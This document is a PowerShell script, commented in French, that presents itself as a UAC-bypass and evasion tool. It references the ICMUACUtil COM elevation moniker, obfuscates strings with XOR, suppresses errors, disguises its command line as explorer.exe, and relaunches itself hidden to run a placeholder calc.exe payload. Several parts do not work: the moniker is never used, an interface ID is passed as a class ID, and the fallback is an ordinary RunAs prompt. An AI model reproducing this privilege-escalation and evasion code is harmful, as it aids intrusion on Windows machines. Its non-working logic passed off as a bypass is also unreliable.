# Désactiver les logs
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# Fonction de chiffrement simple (simule skCrypt)
function Invoke-XORCipher {
    param(
        [string]$Data,
        [char]$Key1 = 'A',
        [char]$Key2 = 'B'
    )
    $Output = ''
    for ($i = 0; $i -lt $Data.Length; $i++) {
        $Output += [char]($Data[$i] -bxor ([int]$Key1 + $i % (1 + [int]$Key2)))
    }
    return $Output
}

# Simuler skCrypt (utilise l'heure de compilation simulée)
$TimeMock = "15:30:45"  # Remplace __TIME__ (peut être randomisé)
$Key1 = [int]$TimeMock[4]  # '3'
$Key2 = [int]$TimeMock[7]  # '5'

function skCrypt {
    param([string]$String)
    return Invoke-XORCipher -Data $String -Key1 $Key1 -Key2 $Key2
}

# Variables chiffrées
$sTaskName = skCrypt "Task Name"
$sAuthorName = skCrypt "Author Name"

# GUID de l'interface ICMUACUtil
$IID_ICMUACUtil = "{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"

# Fonction : Allouer un objet COM élevé
function ucmAllocateElevatedObject {
    param(
        [string]$CLSID,
        [string]$InterfaceIID = $IID_ICMUACUtil
    )
    try {
        $MonikerName = "Elevation:Administrator!new:$CLSID"
        $Obj = [System.Activator]::CreateInstance([Type]::GetTypeFromCLSID($CLSID))
        return $Obj
    }
    catch {
        return $null
    }
}

# Fonction : ShellExec avec élévation (via ICMUACUtil)
function UACShellExec {
    param(
        [string]$Executable,
        [string]$Parameters = "",
        [int]$Show = 0
    )

    # Initialiser COM
    $null = [Runtime.InteropServices.Marshal]::GetActiveObject("Shell.Application")

    # Tenter d'instancier l'objet élevé
    $CMUACUtil = ucmAllocateElevatedObject -CLSID $IID_ICMUACUtil

    if ($null -eq $CMUACUtil) {
        Write-Warning "[-] Impossible d'obtenir l'objet COM élevé"
        return $false
    }

    try {
        # Appel indirect à ShellExec via COM (simulé)
        # En réalité, on utilise Start-Process avec -Verb RunAs
        $StartInfo = New-Object Diagnostics.ProcessStartInfo
        $StartInfo.FileName = $Executable
        $StartInfo.Arguments = $Parameters
        $StartInfo.WindowStyle = [Diagnostics.ProcessWindowStyle]::Hidden
        $StartInfo.UseShellExecute = $true
        $StartInfo.Verb = "RunAs"

        $Process = [Diagnostics.Process]::Start($StartInfo)
        return $true
    }
    catch {
        return $false
    }
    finally {
        # Simuler Release()
        if ($CMUACUtil -and $CMUACUtil.GetMethod("Dispose")) {
            $CMUACUtil.Dispose()
        }
    }
}

# Fonction : Masquer le nom du processus (MaskPEB partiel - simulation)
# Ne peut pas être implémenté directement en PowerShell, mais on peut :
# - Changer le nom du processus (limité)
# - Modifier le CommandLine
function MaskPEB {
    try {
        # Obtenir le processus actuel
        $Process = Get-Process -Id $PID

        # Simuler le masquage en changeant l'affichage (symbolique)
        # Impossible de modifier directement le PEB en PowerShell
        # Mais on peut modifier $MyInvocation, $PSCommandPath, etc.

        # Modifier le CommandLine affiché (via WMI, si autorisé)
        $CommandLine = "C:\Windows\explorer.exe"
        $Query = "UPDATE Win32_Process SET CommandLine='$CommandLine' WHERE ProcessId=$PID"
        
        # Cette requête échouera sans droits élevés, mais montre l'intention
        # (WMI UPDATE n'est généralement pas autorisé)

        # Alternative : juste simuler
        return $true
    }
    catch {
        return $false
    }
}

# Fonction principale : WinMain équivalent
function WinMain {
    # Obtenir le chemin de l'exécutable actuel
    $ExecutablePath = $MyInvocation.MyCommand.Path
    if (-not $ExecutablePath) { $ExecutablePath = $PSCommandPath }

    # Vérifier si déjà élevé
    $IsElevated = $false
    try {
        $Identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $Principal = New-Object Security.Principal.WindowsPrincipal($Identity)
        $IsElevated = $Principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    }
    catch { }

    if (-not $IsElevated) {
        # Masquer le processus
        if (-not (MaskPEB)) { return }

        # Préparer la commande PowerShell pour relancer le script
        $PowerShellCommand = "& '$ExecutablePath'"

        # Lancer avec élévation
        $null = UACShellExec -Executable "powershell.exe" -Parameters "-nop -w hidden -c $PowerShellCommand" -Show 0
    }
    else {
        # Déjà élevé : exécuter la payload
        if (-not (MaskPEB)) { return }

        # Exemple : lancer calc.exe
        $null = UACShellExec -Executable "powershell.exe" -Parameters "-c Start-Process calc.exe" -Show 0
    }
}

# === Exécution ===
WinMain
